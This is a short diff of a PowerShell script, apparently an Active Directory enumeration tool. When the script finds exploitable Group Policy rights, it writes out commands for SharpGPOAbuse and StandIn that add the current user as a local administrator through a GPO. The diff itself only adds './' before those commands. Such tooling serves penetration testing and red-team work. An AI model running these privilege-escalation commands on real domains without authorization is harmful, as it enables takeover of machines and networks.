@@ -145,10 +145,10 @@ if ($foundExploit) {
         
         Add-Content $outfile "    Option A - SharpGPOAbuse"
         # Menggunakan singel quote agar nama GPO dengan spasi tidak error
-        Add-Content $outfile "    SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $me --GPOName '$targetGPO'"
+        Add-Content $outfile "    ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $me --GPOName '$targetGPO'"
         
         Add-Content $outfile "    Option B - StandIn"
-        Add-Content $outfile "    StandIn.exe --gpo --filter '$targetGPO' --localadmin $me"
+        Add-Content $outfile "    ./StandIn.exe --gpo --filter '$targetGPO' --localadmin $me"
     }
 } else {
     Add-Content $outfile "[+] No exploitable GPO rights found for current user"
